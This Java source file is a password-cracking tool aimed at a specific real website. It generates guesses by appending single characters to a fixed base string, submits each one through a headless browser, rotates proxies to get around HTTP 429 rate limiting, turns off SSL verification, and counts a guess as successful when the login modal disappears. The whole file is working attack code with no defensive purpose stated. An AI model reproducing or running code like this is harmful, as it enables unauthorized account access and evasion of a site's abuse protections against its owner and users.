package pw.haze.cracks0da;

import com.gargoylesoftware.htmlunit.BrowserVersion;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Optional;
import java.util.Queue;
import java.util.concurrent.*;

/**
 * @author haze
 * @since 7/11/16
 */
public class Main {


    private String url;
    private Queue<String> guesses;
    private String curGuess;
    private Queue<String> proxies;
    private boolean swapProxy = false;
    private String currentProxy;

    public Main(String url) {

        this.url = url;
        this.guesses = generateGuesses("enustik");
        try {
            this.proxies = new ConcurrentLinkedQueue<>(Files.readAllLines(new File("etc/proxies.txt").toPath()));
        } catch (IOException e) {
            System.out.println("Failed to read proxies file!");
            e.printStackTrace();
        }
        this.currentProxy = this.proxies.poll();

        do {
            if(popGuess())
                System.out.println("Got it!");
            else
                System.out.println("Failed guess for " + this.curGuess);
        } while(!this.guesses.isEmpty());
    }

    // System.out.printf("Got a good page! guess: %d: %s\n", this.guesses.size(), "a");

    private boolean popGuess() {
        if(swapProxy)
            this.currentProxy = this.proxies.poll();
        try(final WebClient webClient = new WebClient(BrowserVersion.BEST_SUPPORTED, currentProxy.split(" ")[0].split(":")[0], Integer.parseInt(currentProxy.split(" ")[0].split(":")[1]))) {
            webClient.getOptions().setUseInsecureSSL(true);
            ExecutorService executor = Executors.newFixedThreadPool(5   );
            this.curGuess = this.guesses.poll();
            Future<Optional<HtmlPage>> futurePage = executor.submit(new CrackSodaWorker(this.curGuess, webClient, this.url));
            Optional<HtmlPage> result = futurePage.get();
            swapProxy = false;
            if(result.isPresent()) {
                return hasSucceeded(result.get());
            } else {
                System.err.printf("Got blank webpage on guess: %d: %s\n", this.guesses.size(), this.curGuess);
            }
        } catch (InterruptedException | ExecutionException e) {
            // e.printStackTrace();
        } catch (FailingHttpStatusCodeException e) {
            if(e.getStatusCode() == 429) {
                try {
                    swapProxy = true;
                    System.out.println("Waiting 10 seconds...! Too many requests!!!");
                    Thread.sleep(10000);
                } catch (InterruptedException e1) {
                    e1.printStackTrace();
                }
            }
        }
        return false;
    }

    private Queue<String> generateGuesses(String base) {
        final Queue<String> queue = new ConcurrentLinkedDeque<>();
        for (String alpha: "abcdefghijklmnopqrstuvexyz1234567890".split("")) {
            queue.add((base + alpha).toLowerCase());
            queue.add((base + alpha).toUpperCase());
        }
        return queue;
    }


    private boolean hasSucceeded(HtmlPage page) {
        return page.getHtmlElementById("LoginModal") == null;
    }


    public static void main(String... args) {
        new Main("http://www.marblesoda.jp");
    }

}
